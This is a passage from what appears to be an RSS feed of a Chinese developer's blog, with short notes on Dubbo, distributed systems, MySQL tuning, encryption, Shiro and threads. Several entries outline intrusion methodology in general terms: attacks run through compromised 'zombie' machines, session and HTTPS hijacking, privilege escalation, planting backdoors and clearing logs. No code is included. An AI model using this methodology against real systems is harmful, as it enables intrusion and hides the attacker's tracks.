service：对外暴露接口 API与SPI分离 config：核心referenceConfig、ServiceConfig serviceConfig----获取远程仓库配置、获取文件配置、貌似还可以获取环境变量 【实质上跟修改本地host一个道理、规定了一个locahost代理 然后操作系统去解析这个配置】 referenceConfig--是消费端配置、其应该是从服务端获取配置信息 proxy：不由想到代理模式、原业务逻辑bean不变、新建bean来实现原bean的代理【也算是一种封装】 registry：注册中心、看过eureka、底层内存中维护了 一个双map结构数据列表、维护服务实例、服务地址、以及代理service等 cluster：路由器、想到最简单的就是url转发、当然肯定没这么简单、应该还会有、实时获取服务列表、负载均衡算法等等 monitor：监控中心、这个web服务把各路信息提上来做一个展示、应该没啥、最多维护一个硬盘文件 protocol：远程调用、怎么调用--不太清楚--再看看 exchange：信息交换、request、response封装 transport：网络传输、大名鼎鼎的netty就在这吧~~ seriallize：数据序列化、提供多重序列化方式、hessian【本地存根方式】、rmi等等吧  </description>
    </item>
    
    <item>
      <title>关于协议</title>
      <link>https://www.wuxinvip.com/blog/agreement/about-agreement/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/agreement/about-agreement/</guid>
      <description>what 协议？ 人民币算不算是一种协议？买家和卖家协议一张纸为 10元 、50元、100元
so ： 协议在互联网届就是发送方和接收方商量好的一种消息模式，
Http：规定两个ip、一个发送ip、一个接收ip、这两个ip进行数据交互时候、先握手、确定数据畅通、然后在进行数据通信、 握手协议：规定握手消息格式【一系列参数的排序】、 数据通信规定http发送消息体消息格式。</description>
    </item>
    
    <item>
      <title>关于漏洞和攻击</title>
      <link>https://www.wuxinvip.com/blog/hack/about-hack/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/about-hack/</guid>
      <description>看过一篇子电影 《没有绝对安全的系统》
首先黑客是怎么攻击一个系统的呢？ 一个系统又是怎么在黑客攻击下崩溃的？
我的猜想： 1、任何系统都是有代码组成、这些系统都是为人服务，需要人为输入数据进行分析、 重点来了 那么这些数据有些就是正常数据、有些则可能是恶意数据、没有任何一个系统是不需要数据输入的、即便都是定制化属性有用户来进行选择、那么我们可以仿造代码进行替换、【语言这个东西又不是只有你一个人会】、 2、然后通过发送请求、测试请求信息、伪造一个请求信息、写成脚本 3、将请求脚本【也就是攻击脚本分发各个肉鸡】、由肉鸡进行攻击
使用肉鸡的原因有几个 1、安全、不暴露攻击者本机ip【攻击时候作死：ping服务器不算】 2、数量可控、可针对不同系统吞吐量 控制不同数量的肉鸡进行攻击
那么什么是恶意数据？ 黑客们精心编制的一组数据、与业务代码中代码进行耦合、以早成运行器崩溃、虚拟机泄漏等等。或者早成无限循环等等</description>
    </item>
    
    <item>
      <title>分布式架构</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-1/</guid>
      <description>最近几年关于架构的信息 高并发架构、 异地多活架构【出自淘宝】 容器化【知名docker、阿里Pouch】 微服务架构【spring cloud】 高可用架构 弹性架构【DB中间件 需要极致的弹性】
相关的技术 DevOps、应用监控、自动化运维、SOA服务治理、去IOE等等
分布式能解决的两大问题： 1、系统容量更大 面对的业务量与日俱增、垂直水平拆分系统业务 2、系统可用性更强 整个系统不会因为一个单点故障而导致整个系统不可用 分布式冗余节点、以消除单点故障
分布式优势： 1、模块化、系统模块重用度更高 2、模块化、服务开发、发布更快 3、系统扩展性更高 4、团队协作更有效率
分布式存在的问题： 1、设计复杂 2、部署单个简单、部署多个复杂 3、系统吞吐量增大、系统反应变慢 4、运维复杂 5、学习难度加大 6、测试复杂 7、技术复杂、带来维护复杂 8、系统中的服务调度、监控等等复杂
分布式前景： 可以说分布式是无法避免的、随着业务量的增大不可能单点跑应用、不同的应用场景会产出不用的服务架构、学习成本是逐渐加大的、等分布式更加成熟形成了体系、应该会产出更加系统的学习方案和应用方案、</description>
    </item>
    
    <item>
      <title>列表List</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-list/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-list/</guid>
      <description>jdk8 ： vector arraylist都是 object[] 也就是数组
linkedlist 是 node first ；node last 也就是链表
另外arraylist中包含sort方法 是可排序的
vector扩展 是double 倍数扩展
 关于数据结构想到这么一种描述方式： 种菜的园子 1、【数组】数据结构、茄子、土豆、冬瓜、南瓜 对应【int string boolean double ..】 我们规划一个园子、自然要分成一块块去种植不同的蔬菜【存放不同的数据】 **提取数据分类方式【数组】** 2、种菜不可避免的规则、一个萝卜一个坑、坑的位置就是数组的坐标、 左边第一排 从上往下数第二个、这个就是坐标、你姥姥让你去摘个茄子、总会让你告诉你摘哪一个、 有人会说了、他会让我采摘根据大小去采摘、那么成了数据的排序了 3、关于链表 链表有三个元素【上一个节点位置、下一个节点位置、本节点存数据】 清晰明了的现实对照物-----还是举例菜园子吧 菜园子分块种着不同的蔬菜、茄子、土豆、冬瓜、南瓜、北瓜、依次种植 那么我们从进出来看、对于人的认知、 茄子右边是土豆 土豆左边是茄子、右边是南瓜 ...一次类推 我们想摘个北瓜吃、就去菜园子里找北瓜的那一块、 我们可以从左往右找，也可从右往左找 这个找的过程就是【链表查找】 【单向链表、双向列表】 有人将我一眼就看到了那块是北瓜地、你忽略了你大脑为了处理你看到的视觉信息处理的过程  </description>
    </item>
    
    <item>
      <title>医院总流程图</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-2/</guid>
      <description></description>
    </item>
    
    <item>
      <title>千万级别系统搭建</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-3/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-3/</guid>
      <description>结合springcloud 1.服务分级SOA 2.流量带宽(1M17用户.按一千万并发计算需要600M带宽.当然1M17用户前提是网页数据60kb) 3.数据库分层(垂直.横向是最基本的.还有灵活添加\卸载数据库). 千万级别用户.数据量至少亿级别.数据库每百万分一个. 至少100+数据库(若要是应对高并发.高峰流量冲击可以使用AliSQL) 4.那么准备zuul网关服务器就得有(按每个tomcat并发1500计算) 要考虑的点. 网卡属性.tomcat支持并发. nginx支持并发(用来放在zuul前面可以支持一台服务器部署多个zuul). 内存容量.cpu计算能力. 内存用量和cpu计算能力 限定了数据库和tomcat计算能力.所以也不是单看一个点就能估算并发能力 5.还有访问深度.访问跟踪各个服务跟踪状况. 还是得学习啊  限流
限制瞬时并发 限制总并发数 限制时间窗口内平均速率 相关算法：滑动窗口协议 漏桶--- 令牌桶----应对突发流量 计数器  </description>
    </item>
    
    <item>
      <title>容器已经关闭</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud-exception/exception-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud-exception/exception-1/</guid>
      <description>spring cloud task 启动报错 context has been closed already
解决办法 1.5.2 版本ok 2.0.0 报错容器已关闭 解决办法 #spring.cloud.task.closecontext_enabled=false  spring cloud Ribbon
解决办法
写到启动类就行
 spring boot &amp;lt;= 1.3 无需定义 spring boot &amp;gt;= 1.4 springboot不在维护 需要自己定义RestTempalte @Bean public RestTemplate restTemplate (RestTemplateBuilder builder){ //Do any additional configuration here return builder.build(); }  </description>
    </item>
    
    <item>
      <title>密码加密方式</title>
      <link>https://www.wuxinvip.com/blog/encryption/password-develop/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/encryption/password-develop/</guid>
      <description>常见攻击方式： 字典攻击：早期base64+md5
破解方式&amp;ndash;把常见密码进行base63+md5加密 通过重复登陆服务器 或者拖库进行匹配破解【破解方式属于开放状态】
对称加密
加密解密效率高、速度快、空间占用小、加密强度高 缺点是 参与多方都需要持有密钥、一旦有一个人泄露则安全性遭到破坏、另外再不容安全通道下分发密钥也是个问题 代表算法：DES、3DES、AES、IDEA等等 DES：其密钥长度为56位+8位校验 破解方式：暴力破解 3DES：3重DES操作 算法不能靠累积增加防御力 AES：分组算法、分组长度为128、192、256位三种、其优势在于 速度快 整个过程可以数学化描述、目前尚未有效破解手段 适用于大量数据加解密、不能用于签名场景 需要提前分法密钥  非对称加密
 即公钥+私钥 公钥是公开的、私钥是个人持有的 代表算法：RSA、EIGamal、椭圆算法 ECC RSA：经典的公钥算法 安全性未知 EIGamal：利用了模运算下求离散对数困难的特性 椭圆曲线算法：现代备受关注的算法系列，基于对椭圆曲线上特定点进行特殊乘法逆运算难以计算的特性。 RSA 算法等已被认为不够安全，一般推荐采用椭圆曲线系列算法。  混合加密机制
先用计算复杂度高的非对称加密协商一个临时的对称加密密钥（会话密钥，一般相对内容来说要短得多），然后对方在通过对称加密对传递的大量数据进行加解密处理。 典型应用：现在大家常用的HTTPS机制、 HTTPS实际上是利用了Transport Layer Security/Secure Socket Layer（TLS/SSL）来实现可靠性传输、TLS为SSL升级版本 目前广泛应用的为 TLS1.0 对应到SSL3.1 版本  建立安全连接的具体步骤如下：
 客户端浏览器发送信息到服务器，包括随机数 R1，支持的加密算法类型、协议版本、压缩算法等。注意该过程为明文。 服务端返回信息，包括随机数 R2、选定加密算法类型、协议版本，以及服务器证书。注意该过程为明文。 浏览器检查带有该网站公钥的证书。该证书需要由第三方 CA 来签发，浏览器和操作系统会预置权威 CA 的根证书。如果证书被篡改作假（中间人攻击），很容易通过 CA 的证书验证出来。 如果证书没问题，则用证书中公钥加密随机数 R3，发送给服务器。此时，只有客户端和服务器都拥有 R1、R2 和 R3 信息，基于 R1、R2 和 R3，生成对称的会话密钥（如 AES算法）。后续通信都通过对称加密进行保护。  最简单的哈希加密</description>
    </item>
    
    <item>
      <title>常见MYSQL调优策略</title>
      <link>https://www.wuxinvip.com/blog/mysql/optimization-sql-total-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/optimization-sql-total-2/</guid>
      <description>调优层次：硬件层、磁盘IO、文件系统层、
硬件层
修改服务器BIOS设置 1.选择Performance Per Watt Optimized(DAPC)模式 、发挥cpu最大性能 2.Memory Frequency(内存频率)选择 Maximum Performance (最佳性能) 3.内存设置菜单中，启用Node Interleaving 避免NUMA问题  磁盘IO
1.使用SSD磁盘(瞬时写入非常高、还可以避免很多技术问题) 2.如果是磁盘阵列存储，建议阵列卡同时配备CACHE及BBU模块，可以明显提升IOPS。 3.raid级别尽量选择raid10.而不是raid5(双io方式、也能提高安全性等等)  文件系统层
1.使用deadline/noop这两种I/O调度器。千万别用cfq 2.使用xfs文件系统、千万别用ext3、ext4勉强可用、但是事务量很大一定要用xfs 3.文件系统mount参数中增加：noatime，nodiratime，nobarrier几个选项(nobarrier是xfs文件系统特有的)  内核参数优化
1.修改vm.swappiness参数，降低swap使用率，RHEL7/centos7以上则慎重设置为0，可能引发OOM(物理内存使用到了90%之后才去修改、设为5-10就可以) 2.调整vm.dirty_background_ratio(脏数据量占内存量百分比、超过后将脏数据刷到磁盘、最大值（阻塞写）10%)、vm.dirty ratio(标准值（非阻塞写）5%) 内核参数、以确保能持续将脏数据刷新到磁盘，避免瞬I/O写，产生等待。 3.调整net.ipv4.tcp_tw_recycle、net.ipv4.tcp_tw_reuse都设置为1、减少Time_wait,提高TCP效率  MYSQL参数优化建议</description>
    </item>
    
    <item>
      <title>总结</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-3/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-3/</guid>
      <description>梳理一下脑子里的东西按点整理一下
消息中间件，ActiveMQ.Kafka.ZeroMQ.RabbitMQ.RocketMQ
服务治理Dubbo.eureka.
服务网springcloud
cpu线程
docker容器
负载均衡lvs radware nginx keepalived
端口转发，网卡驱动
jvm内存 . 堆.栈 规则 一个线程会占用掉多少内存.一个对象会占用多少内存
javac 编译后文件 字节码文件
数据库mysql.alisql.oracle (并发.事物.存储过程)
Nosql.redis.memcached.ecache.mongdb
算法、负载均衡算法，缓存淘汰算法，排序算法，数据整理算法
uml设计.部署图，流程图，ER图，时序图。
搜索引擎
权限架构
IO:AIO　BIO NIO　消息流　Netty
怎么讲呢 今年大脑经历了大量信息的冲击.有些东西可能会很快忘记.留下的只有感悟.经验
总结.构建知识体系. 分流:负载均衡(软硬件).算法(随机.权重.最小调用). 软件:nginx.vortex.radware 硬件:LVS.F5 缓存: Redis. Memcached. Mongdb. ehcache 问题:缓存击穿.缓存同步 并发.线程. 数据库:mysql.AliSQL 容量.并发线程.事物提交.存储过程 java基本功.io.util.sql. 主流中间件: RPC:dubbo. eureka 消息中间件rocketmq.rabbitmq.zeromq. 技术架构:springcloud 服务架构:SOA  渗透: 1.基本工具使用 比如wifi劫持.https劫持.session劫持. 1.5.网站探测:whois.钟馗之眼. 2.跳点搭建.vpn.或者直接控制肉鸡进行跳点 3.主机扫描.漏洞扫描.关注国家网络安全网发布的漏洞. 4.脚本攻击.shell脚本 python脚本 5.日志清除.  今日起 关注人工智能、进军人工智能。以备将来使用。</description>
    </item>
    
    <item>
      <title>技术发展</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-0/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-0/</guid>
      <description>从qq的点对点通信 到微博的多人群聊话题 到电商 人类进化就有的课题&amp;ndash;交易 交易的大量订单促使了&amp;ndash;数据分析 数据分析的性能要求&amp;ndash;出现了云计算 云计算的产生又引发了&amp;ndash;人工智能 【人工智能就是根据数据分析做出一个合理的判断、大概模式就是 从一个大的数据库里寻找最合理的返回答案】
那么下一个阶段是什么？</description>
    </item>
    
    <item>
      <title>技术负责人应有的几项要求</title>
      <link>https://www.wuxinvip.com/blog/technical-summary/technical-summary-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/technical-summary/technical-summary-2/</guid>
      <description>1、把控进度 2、把控风险 3、任务分发【开发量分配】 4、需求分析、需求拆解【功能可实现性功能实现周期预估】、需求合理性判断 5、技术过关【架构、细节、各个组件的选型】</description>
    </item>
    
    <item>
      <title>数据库设计三大范式</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-design-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-design-1/</guid>
      <description>1．第一范式(确保每列保持原子性)
2．第二范式(确保表中的每列都和主键相关)
3．第三范式(确保每列都和主键列直接相关,而不是间接相关)
一、第一范式是最基本的范式。如果数据库表中的所有字段值都是不可分解的原子值，就说明该数据库表满足了第一范式。
第一范式的合理遵循需要根据系统的实际需求来定。比如某些数据库系统中需要用到“地址”这个属性，本来直接将“地址”属性设计成一个数据库表的字段就行。但是如果系统经常会访问“地址”属性中的“城市”部分，那么就非要将“地址”这个属性重新拆分为省份、城市、详细地址等多个部分进行存储，这样在对地址中某一部分操作的时候将非常方便。这样设计才算满足了数据库的第一范式，如下表所示。
上表所示的用户信息遵循了第一范式的要求，这样在对用户使用城市进行分类的时候就非常方便，也提高了数据库的性能。
二、第二范式在第一范式的基础之上更进一层。第二范式需要确保数据库表中的每一列都和主键相关，而不能只与主键的某一部分相关（主要针对联合主键而言）。也就是说在一个数据库表中，一个表中只能保存一种数据，不可以把多种数据保存在同一张数据库表中。
比如要设计一个订单信息表，因为订单中可能会有多种商品，所以要将订单编号和商品编号作为数据库表的联合主键，如下表所示。
订单信息表
这样就产生一个问题：这个表中是以订单编号和商品编号作为联合主键。这样在该表中商品名称、单位、商品价格等信息不与该表的主键相关，而仅仅是与商品编号相关。所以在这里违反了第二范式的设计原则。
而如果把这个订单信息表进行拆分，把商品信息分离到另一个表中，把订单项目表也分离到另一个表中，就非常完美了。如下所示。
这样设计，在很大程度上减小了数据库的冗余。如果要获取订单的商品信息，使用商品编号到商品信息表中查询即可。
三、第三范式需要确保数据表中的每一列数据都和主键直接相关，而不能间接相关。
比如在设计一个订单数据表的时候，可以将客户编号作为一个外键和订单表建立相应的关系。而不可以在订单表中添加关于客户其它信息（比如姓名、所属公司等）的字段。如下面这两个表所示的设计就是一个满足第三范式的数据库表。
这样在查询订单信息的时候，就可以使用客户编号来引用客户信息表中的记录，也不必在订单信息表中多次输入客户信息的内容，减小了数据冗余。
转载地址</description>
    </item>
    
    <item>
      <title>服务器带宽</title>
      <link>https://www.wuxinvip.com/blog/service-deploy/bandwidth/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-deploy/bandwidth/</guid>
      <description>首先要知道影响在线人数的因素
1，访问量
2，网站类型：如果是出文字的网站(如小说站)，1M带宽带动日均5000IP，还勉强。如果是普通网站有图片，有文字、论坛、新闻资讯类型网站 大概1M能带一千IP。考虑到高峰期并发，1M高峰期还会卡。【最低配 单核CPU+512内存。1千IP CPU占用10%左右，内存200到300之间】。
下面根据影响因素计算下1M带宽能同时承受多少人在线(以网络状况良好为前提)
1、
打开网站8秒原则;
2、 评判的只是：用户从云服务器下载文件的速度;
3、 页面的标准尺寸大小为：60KB;
参考公式：支持连接个人 = 服务器带宽/页面尺寸大小
通过计算大致结果是，1Mbps的带宽(服务器的1M带宽最快上下速度能达到1M/s，跟我们家用的带宽稍有区别)支持的连接数为：17个
因此，N M带宽可以支持的同时在线人数大概为N*17个
所以，1M带宽的云主机，日均3000IP以下应该没问题。当然如果你的每个页面都比较大的话，那就没这么多了。具体多少，可以按照上面的算法算下。
初次访问 362kb 第二次访问 36kb pv 8641+2007+1000 = 11648 pv * 362 = 4216576kb = 4117.75MB 4GB流量 market 初次171kb 第二次 28kb pv= 3000 pv * 171 = 513000 = =500.97MB 一天按5GB 流量 30天 是 150GB流量 0.8 * 150 = 120RMB 带宽 5 Mbps 125 RMB 10 Mbps 125 + （10 - 5 ）* 80RMB = =525 RMB元  </description>
    </item>
    
    <item>
      <title>权限系统_shiro_授权流程</title>
      <link>https://www.wuxinvip.com/blog/service-permission/shiro-1/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-permission/shiro-1/</guid>
      <description>Shiro Authorization （ 授权）
官方授权图片
步骤： 授权成功后
关于权限使用有三种方式
1、编写代码
2、JDK标签
3、JSPGSP标签库
这里要解释下 RBAC 以前的RBAC是 Role-Based-Access-Control
基于角色的访问控制
权限表 是 用户表-角色表-操作url表 【Menu】
控制方式是 用户拥有某权限&amp;mdash;&amp;mdash;&amp;ndash;权限拥有某url【controller】 才可以访问 麻烦点就是 后台判断用户是否拥有权限时，判断用户角色 那么就是把角色和资源绑定到一起、这样后期开发会发生这么一种情况、就是有个默认角色后期我可能要删除、使用新角色来控制这些资源、那么 到时候就要更新代码重新发布 而最新的RBAC是 Resource-Based-Access-Control 基于资源的访问控制
权限表是 用户表【user】-角色表-功能许可表【Permission】
控制方式就是 用户拥有某一角色&amp;mdash;&amp;mdash;&amp;ndash;角色拥有这一资源许可&amp;mdash;&amp;mdash;-资源许可和代码【controller】绑定在一起 后期要更改角色权限 就把这个角色删掉就可以了 并不会影响代码 不需要重构代码
shiro中同时使用两种方式进行 权限判断 用户可以自行选择 相关使用方法 参加xmind</description>
    </item>
    
    <item>
      <title>权限系统_shiro_验证流程</title>
      <link>https://www.wuxinvip.com/blog/service-permission/shiro-2/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-permission/shiro-2/</guid>
      <description>权限分为：操作权限、业务权限、数据权限三种
１、操作权限
现阶段操作权限都是使用shiro进行控制 shiro 也是基于RBAC思想 【不懂的小朋友就去百度RBAC】 shiro 的表设计　最基本的无张表：用户表、用户角色表、角色表、角色操作权限表、操作权限表、 一般也满足使用了　复杂点有用户组表　角色组表　等等　这些RBAC都有介绍  那么　What is Apache Shiro? Apache Shiro 是一个强大而灵活的开源安全框架，它干净利落地处理身份认证，授权，企业会话管理和加密。
这个比较牛逼、集成了 shiro 什么权限怎么控制的你就不用管了、照着他的文档使用就可以了、页面操作按钮【可以使用Tag控制】 web.xml　添加了拦截器之后、他能保证整个会话中都知道用户的权限、一直放到缓存中、你在整个流程中想要什么时候查询整个用户的角色、ｉｄ都可以直接通过他的方法拿到、那么他是怎么实现的呢？ 其实把他理解成一个封装工具或者一个安全框架也行、契合到项目中使用、简洁我们自己的代码、而且他这个工具还是Apache的　在安全方面还是比较值得信任的
那么他做了什么呢？　官方有以下说明： 验证用户来核实用户身份 对用户访问进行控制 判断用户是否被分配了一个确定的安全角色 判断用户是否被允许做某事 在任何环境下使用SessionAPI　即使没有　web　EJB容器 在身份验证、访问控制期间、会话的生命周期、对事件做出反应 聚集一个或多个用户安全数据源、并作为一个单一复合用户“视图” 启动单点登陆【SSO】功能 为没有关联登陆的用户启用　Remember Me服务 。。。
关于实现原理： shiro 团队　把这四个功能成为　应用程序的四大基石：身份认证、授权、会话管理、加密
shiro核心部分：
Authentication：有时也简称为“登录”，这是一个证明用户是他们所说的他们是谁的行为。 Authorization：访问控制的过程，也就是绝对“谁”去访问“什么”。 Session Management：管理用户特定的会话，即使在非 Web 或 EJB 应用程序。 Cryptography：通过使用加密算法保持数据安全同时易于使用。  看不懂？那么想想我们自己的登陆系统应该是怎样的呢？ 那么这样就好理解了　登陆就像是Authentication　管理用户标识　谁是谁　那么Authorization就像是登陆系统中的查看角色权限等功能＼管理谁应该访问什么资源　Session　Management　就是一个管理会话的工具　将返还的ticket放置在哪里传递给用户 Cryptography 暂时就理解为加密算法 额外功能： Web Support：Shiro 的 web 支持的 API 能够轻松地帮助保护 Web 应用程序。 Caching：缓存是 Apache Shiro 中的第一层公民，来确保安全操作快速而又高效。 Concurrency：Apache Shiro 利用它的并发特性来支持多线程应用程序。 Testing：测试支持的存在来帮助你编写单元测试和集成测试，并确保你的能够如预期的一样安全。 &amp;quot;Run As&amp;quot;：一个允许用户假设为另一个用户身份（如果允许）的功能，有时候在管理脚本很有用。 &amp;quot;Remember Me&amp;quot;：在会话中记住用户的身份，所以他们只需要在强制时候登录。  分解下：</description>
    </item>
    
    <item>
      <title>权限系统_数据权限控制</title>
      <link>https://www.wuxinvip.com/blog/service-permission/permission-data/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-permission/permission-data/</guid>
      <description>1、使用 query filter  先举例说明一下数据权限，假设一个工作任务应用有以下的需求：
普通员工可以查看自己的工作项 部门经理可以查看自己管理部门的所有工作项 对于普通员工和部门经理，他们访问应用的入口都是相同的，应用需要根据不同的角色返回不一样的数据结果，这就是数据权限控制。
数据权限是个比较复杂的问题，规则非常灵活，在Leap中并没有内置实现，但提供了一个基础机制，可以相对简单的实现数据权限。
 1.1 查询过滤器（Query Filter）  查询过滤器是 ORM 模块中的功能，默认是关闭的，开启后所有的查询语句都会在 where 语句的最后自动加上类似 @filter(User) 的表达式。
假设执行查询语句：
select * from user u where u.name = :name 那么开启 Query Filter 后将会自动变为： select * from user u where ( u.name = :name ){? and ( @filter(User) )} 关于查询过滤器的细节在这里不展开细说，下面具体说明如何使用查询过滤器实现数据权限。   1.2 基于 Query Filter 实现数据权限
 1.3 开启
  修改 src/main/resources/conf/config.xml ，增加以下配置属性：
&amp;lt;properties prefix=&amp;quot;orm&amp;quot;&amp;gt; &amp;lt;property name=&amp;quot;query_filter.</description>
    </item>
    
    <item>
      <title>架构师之路</title>
      <link>https://www.wuxinvip.com/blog/essay/%E6%9E%B6%E6%9E%84%E5%B8%88%E4%B9%8B%E8%B7%AF/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E6%9E%B6%E6%9E%84%E5%B8%88%E4%B9%8B%E8%B7%AF/</guid>
      <description>本着对技术的兴趣 进入了软件开发行业
可以说是如鱼得水的发展 凭借着年轻 挑灯夜战 掌握了许多技术应用、但仍脱不开技术应用者的领域
如今职业发展遇到瓶颈-该思考何去何从
想来想去只有选择架构师为发展方向
怎样成为一个架构师？
首先什么是架构师？
随着互联网应用的快速发展、各个领域相继进入互联网、各种业务形式的应用、一个合理的架构应对服务流量冲击显得尤为重要
那么应用架构针对应用更好的优化、分解、先有soa、后有微服务概念、 对于这个整体的请求走势要做到心中有数、到细节中每个请求的所经过的服务器心里有谱、对服务器承载能力有着清晰的认识
脑海里要有一个三维网络图
同时能细节看到某个节点内部的工作方式、又能从宏观角度看的到请求流转、敏锐感知节点中的压力点
然后针对业务领域、每个请求的频率、有一个经验教训、才能更好的使用脑海中的技术架构去整合起来业务压力
外包待出的毛病，除了用，啥都不会</description>
    </item>
    
    <item>
      <title>渗透的艺术</title>
      <link>https://www.wuxinvip.com/blog/hack/art-infiltration/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/hack/art-infiltration/</guid>
      <description>分类 描述内容     信息收集 收集域名、服务器ip、指纹   漏洞挖掘 组件指纹、应用层   漏洞利用 目的、ddos、   权限提升 提升shell权限   后门 留下下次访问后门 肉鸡   日志清扫 删除系统日志   经验总结 记录攻击漏洞、肉鸡ip    别人总结的　如有侵犯　请私信　哈哈．．．</description>
    </item>
    
    <item>
      <title>版本问题</title>
      <link>https://www.wuxinvip.com/blog/spring-boot/version-config/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-boot/version-config/</guid>
      <description>springboot 1.x
server.context-path=/demo
springboot 2.x
server.servlet.context-path=/demo 不兼容了许多组建:sleuth.
1.5的springboot 对各大开源组件兼容的版本比较低 比如es、
因项目中使用es。5.X、spring-boot1.5兼容到4.X版本
而springboot对es5.x的兼容是spring-boot2.0版本、干的项目里前后不能相顾、很尴尬。。</description>
    </item>
    
    <item>
      <title>用户池系统 构思</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-4/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-4/</guid>
      <description>以年龄为例 task 获取数据以年龄排序 将数据以list形式存放到redis中 key 可从配置中获取 .
为了安全不建议直接把key发送到前端.可在配置做一个等价替换
不同的key对应不同的分组数据
前端访问webapp 获取key的加密值 和 默认信息列表
获取不同排序 前端发送不同的key值即可
跑批任务最后可以在redis数据失效之前把数据存储到mysql 优点: 1.不需要修改webapp和webview 2.只需要修改跑批任务(算法添加、不同算法对应的配置更新到cloud config) 3.数据存储样式可用“配置_list”存储
问题: 1.用户抢单后要削减用户列表.元列表并发存在修改问题 解决:在最终抢单时候来后台查询已抢单列表就行.修不修改的有错误也没事.
(使用mysql存储数据? 也不能解决这个问题 反而会触及mysql并发量问题)
目前方案:mysql主从复制.从&amp;rdquo;从sql&amp;rdquo;查询数据</description>
    </item>
    
    <item>
      <title>系统设计一些基本原则</title>
      <link>https://www.wuxinvip.com/blog/service-design/design-0/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-design/design-0/</guid>
      <description>参照梁飞&amp;ndash;dubbo创始人&amp;mdash;一些设计上的基本常识
不看不知道 一看吓一跳 原来一个复杂的服务系统这么多门道
以前只晓得 API SPI分离。。。
API 与 SPI 分离 服务域/实体域/会话域分离 在重要的过程上设置拦截接口 重要的状态的变更发送事件并留出监听接口 扩展接口职责尽可能单一，具有可组合性 微核插件式，平等对待第三方 不要控制外部对象的生命周期 可配置一定可编程，并保持友好的 CoC 约定 区分命令与查询，明确前置条件与后置条件 增量式扩展，而不要扩充原始核心概念  </description>
    </item>
    
    <item>
      <title>线程</title>
      <link>https://www.wuxinvip.com/blog/jdk/jdk-thread/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/jdk/jdk-thread/</guid>
      <description>线程四种 单线程 固定数目线程 缓存线程 定时线程
关于线程:
1.线程并不是越多越好.切换线程的开销很大、如果线程太多、切换时间远大于执行时间就得不偿失了 2.线程该用才用.跟事物一样.不该用不要用.否则反而降低性能 3.线程池数量 差不多是 CPU核数 * 2 4.阿里编码规范已不推荐使用ExcutorService方法使用线程
【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样 的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。 说明：Executors 返回的线程池对象的弊端如下： 1）FixedThreadPool 和 SingleThreadPool: 允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。 2）CachedThreadPool 和 ScheduledThreadPool: 允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。  代码地址:https://gitee.com/none_heart/xingchen/tree/master/excutor</description>
    </item>
    
    <item>
      <title>缓存淘汰算法</title>
      <link>https://www.wuxinvip.com/blog/cache/cache-elimination-algorithm/</link>
      <pubDate>Sat, 24 Mar 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/cache/cache-elimination-algorithm/</guid>
